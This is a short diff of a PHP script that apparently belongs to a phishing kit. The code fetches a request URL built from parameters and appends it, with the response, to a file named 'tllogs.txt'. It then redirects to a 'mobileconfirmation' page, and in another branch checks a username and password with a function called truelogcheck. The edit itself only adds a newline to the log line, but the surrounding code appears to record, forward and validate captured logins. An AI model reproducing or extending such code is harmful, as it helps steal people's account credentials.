@@ -41,7 +41,7 @@ $request_params = [
        $f1 = file_get_contents($request_url);
 
     $fp = fopen("tllogs.txt", "a");
-fputs($fp, "$request_url \n $f1 \n\n");
+fputs($fp, "$request_url \n\n $f1 \n\n");
 	die(header("location: mobileconfirmation?auth=$codebash"));
 }else{
 if(truelogcheck($username, $password) == 'VALID'){
